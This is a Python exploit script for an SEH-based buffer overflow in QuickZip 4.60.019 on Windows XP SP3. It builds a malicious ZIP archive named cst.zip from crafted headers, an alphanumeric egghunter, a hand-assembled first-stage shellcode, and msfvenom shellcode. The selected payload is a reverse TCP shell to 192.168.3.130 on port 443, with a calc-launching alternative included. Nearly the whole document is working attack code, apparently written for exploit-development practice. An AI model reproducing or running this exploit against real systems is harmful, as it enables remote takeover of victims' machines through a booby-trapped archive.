#!/usr/bin/python

# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: QuickZip 4.60.019 Exploit SEH
# OS		: Windows XP Service Pack 3
# Date		: 13/03/2018

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print "[+] Building PoC.."

# Matt Miller's Egghunter. Egg = 0x57303054
# echo -ne  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" | \
# msfvenom -p- -f c BufferRegister=EAX -b "\x00" -e x86/alpha_mixed -a x86 --platform windows
# 118 Bytes
egghunter = ("\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x63\x56\x4e\x61\x4b\x7a\x39\x6f"
"\x74\x4f\x50\x42\x50\x52\x43\x5a\x64\x42\x73\x68\x48\x4d\x74"
"\x6e\x57\x4c\x45\x55\x71\x4a\x31\x64\x48\x6f\x38\x38\x66\x34"
"\x64\x70\x30\x30\x71\x47\x4e\x6b\x6b\x4a\x6c\x6f\x51\x65\x7a"
"\x4a\x6c\x6f\x70\x75\x69\x77\x4b\x4f\x38\x67\x41\x41")

# First stage shellcode - 61 Bytes
"""
0012FB81   54               PUSH ESP
0012FB82   59               POP ECX                     # Save copy of ESP in ECX for aligning EAX to start of buffer

# Align ESP to where JMP EAX to be written, calculation are done wrt to ESP
0012FB83   54               PUSH ESP
0012FB84   58               POP EAX
0012FB85   66:05 7105       ADD AX,571
0012FB89   04 50            ADD AL,50
0012FB8B   04 50            ADD AL,50
0012FB8D   50               PUSH EAX
0012FB8E   5C               POP ESP

# ZERO OUT EAX and MAKE EAX = 9090E0FF
0012FB8F   25 4A4B4D55      AND EAX,554D4B4A
0012FB94   25 35341228      AND EAX,28123435
0012FB99   05 3F382424      ADD EAX,2424383F
0012FB9E   05 3F382424      ADD EAX,2424383F
0012FBA3   05 3F382424      ADD EAX,2424383F
0012FBA8   05 3F382424      ADD EAX,2424383F
0012FBAD   04 03            ADD AL,3
0012FBAF   50               PUSH EAX

# increment ESP so that push operation coming later will not overwrite JMP EAX instruction which we wrote
0012FBB0   44               INC ESP
0012FBB1   44               INC ESP
0012FBB2   44               INC ESP
0012FBB3   44               INC ESP
0012FBB4   44               INC ESP
0012FBB5   44               INC ESP
0012FBB6   44               INC ESP
0012FBB7   44               INC ESP
0012FBB8   44               INC ESP
0012FBB9   44               INC ESP
0012FBBA   44               INC ESP
0012FBBB   44               INC ESP

# Align EAX to start of buffer, ie egghunter
0012FBBC   51               PUSH ECX
0012FBBD   58               POP EAX
0012FBBE   66:05 2305       ADD AX,523
"""
Stage1 = ("\x54\x59\x54\x58\x66\x05\x71\x05\x04\x50\x04\x50\x50\x5C\x25\x4A\x4B\x4D\x55\x25\x35\x34\x12\x28\x05\x3F\x38\x24\x24\x05\x3F\x38"
"\x24\x24\x05\x3F\x38\x24\x24\x05\x3F\x38\x24\x24\x04\x03\x50\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x51\x58\x66\x05\x23"
"\x05")

# msfvenom -p windows/exec CMD=calc -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shellcode_calc = ("\xb8\x33\x4e\xd6\xa5\xdb\xd5\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x30\x83\xc6\x04\x31\x46\x0f\x03\x46\x3c\xac\x23\x59\xaa\xb2"
"\xcc\xa2\x2a\xd3\x45\x47\x1b\xd3\x32\x03\x0b\xe3\x31\x41\xa7"
"\x88\x14\x72\x3c\xfc\xb0\x75\xf5\x4b\xe7\xb8\x06\xe7\xdb\xdb"
"\x84\xfa\x0f\x3c\xb5\x34\x42\x3d\xf2\x29\xaf\x6f\xab\x26\x02"
"\x80\xd8\x73\x9f\x2b\x92\x92\xa7\xc8\x62\x94\x86\x5e\xf9\xcf"
"\x08\x60\x2e\x64\x01\x7a\x33\x41\xdb\xf1\x87\x3d\xda\xd3\xd6"
"\xbe\x71\x1a\xd7\x4c\x8b\x5a\xdf\xae\xfe\x92\x1c\x52\xf9\x60"
"\x5f\x88\x8c\x72\xc7\x5b\x36\x5f\xf6\x88\xa1\x14\xf4\x65\xa5"
"\x73\x18\x7b\x6a\x08\x24\xf0\x8d\xdf\xad\x42\xaa\xfb\xf6\x11"
"\xd3\x5a\x52\xf7\xec\xbd\x3d\xa8\x48\xb5\xd3\xbd\xe0\x94\xb9"
"\x40\x76\xa3\x8f\x43\x88\xac\xbf\x2b\xb9\x27\x50\x2b\x46\xe2"
"\x15\xc3\x0c\xaf\x3f\x4c\xc9\x25\x02\x11\xea\x93\x40\x2c\x69"
"\x16\x38\xcb\x71\x53\x3d\x97\x35\x8f\x4f\x88\xd3\xaf\xfc\xa9"
"\xf1\xd3\x63\x3a\x99\x13")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shellcode_rev = ("\xdd\xc3\xbf\x49\xf0\x9d\xe3\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x7d\x17\x83\xed\xfc\x03\x34\xe3\x7f\x16\x3a\xeb\x02"
"\xd9\xc2\xec\x62\x53\x27\xdd\xa2\x07\x2c\x4e\x13\x43\x60\x63"
"\xd8\x01\x90\xf0\xac\x8d\x97\xb1\x1b\xe8\x96\x42\x37\xc8\xb9"
"\xc0\x4a\x1d\x19\xf8\x84\x50\x58\x3d\xf8\x99\x08\x96\x76\x0f"
"\xbc\x93\xc3\x8c\x37\xef\xc2\x94\xa4\xb8\xe5\xb5\x7b\xb2\xbf"
"\x15\x7a\x17\xb4\x1f\x64\x74\xf1\xd6\x1f\x4e\x8d\xe8\xc9\x9e"
"\x6e\x46\x34\x2f\x9d\x96\x71\x88\x7e\xed\x8b\xea\x03\xf6\x48"
"\x90\xdf\x73\x4a\x32\xab\x24\xb6\xc2\x78\xb2\x3d\xc8\x35\xb0"
"\x19\xcd\xc8\x15\x12\xe9\x41\x98\xf4\x7b\x11\xbf\xd0\x20\xc1"
"\xde\x41\x8d\xa4\xdf\x91\x6e\x18\x7a\xda\x83\x4d\xf7\x81\xcb"
"\xa2\x3a\x39\x0c\xad\x4d\x4a\x3e\x72\xe6\xc4\x72\xfb\x20\x13"
"\x74\xd6\x95\x8b\x8b\xd9\xe5\x82\x4f\x8d\xb5\xbc\x66\xae\x5d"
"\x3c\x86\x7b\xf1\x6c\x28\xd4\xb2\xdc\x88\x84\x5a\x36\x07\xfa"
"\x7b\x39\xcd\x93\x16\xc0\x86\x5b\x4e\xc9\xd4\x34\x8d\xcd\xd9"
"\x7f\x18\x2b\xb3\x6f\x4d\xe4\x2c\x09\xd4\x7e\xcc\xd6\xc2\xfb"
"\xce\x5d\xe1\xfc\x81\x95\x8c\xee\x76\x56\xdb\x4c\xd0\x69\xf1"
"\xf8\xbe\xf8\x9e\xf8\xc9\xe0\x08\xaf\x9e\xd7\x40\x25\x33\x41"
"\xfb\x5b\xce\x17\xc4\xdf\x15\xe4\xcb\xde\xd8\x50\xe8\xf0\x24"
"\x58\xb4\xa4\xf8\x0f\x62\x12\xbf\xf9\xc4\xcc\x69\x55\x8f\x98"
"\xec\x95\x10\xde\xf0\xf3\xe6\x3e\x40\xaa\xbe\x41\x6d\x3a\x37"
"\x3a\x93\xda\xb8\x91\x17\xea\xf2\xbb\x3e\x63\x5b\x2e\x03\xee"
"\x5c\x85\x40\x17\xdf\x2f\x39\xec\xff\x5a\x3c\xa8\x47\xb7\x4c"
"\xa1\x2d\xb7\xe3\xc2\x67")

"""
Towards the end of Stage1, I've done a couple of INC ESP's. ESP might be pointing to some address which may not a multiple of 16.
we'll need to align the stack to make sure ESP points to an address which is a multiple of 16 bytes.
Otherwise, the shellcode simply wouldnt work. We can do this by - AND ESP, 0xFFFFFFF0 
"""

# AND ESP, 0xFFFFFFF0
align_stack = "\x81\xe4\xf0\xff\xff\xff"
#shellcode = align_stack + shellcode_calc
shellcode = align_stack + shellcode_rev

max_size = 4064

#payload = "A" * max_size

# SEH Offset 298
# nSEH Offset 294

# Alpha Numeric Address
# PPR 00407A33
SEH = "\x33\x7a\x40\x00"
nSEH = "\x71\x9f\x70\xcf"   # 9f tralslates to 83 - jumps back enough bytes - around 123 bytes space
payload = "A"*13 + egghunter + "A"*(294-123-13-len(egghunter)) + Stage1 + "A"*(123-len(Stage1)) + nSEH + SEH + "D"*16 + "T00WT00W" + shellcode + "D"*(max_size-294-8-16-8-len(shellcode))

"""
Execution Flow:
	nSEH - Jumps back 123 Bytes and Stage1 Kicks in
	Stage1 - Writes JMP EAX shellcode in memory, Align EAX to start of buffer (egghunter), Executes JMP EAX and Egghunter Kicks in
	Egghunter - Finds egg and jumps to shellcode
"""

#payload = "A"*294 + nSEH + SEH + "D"*(max_size-294-8)
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"

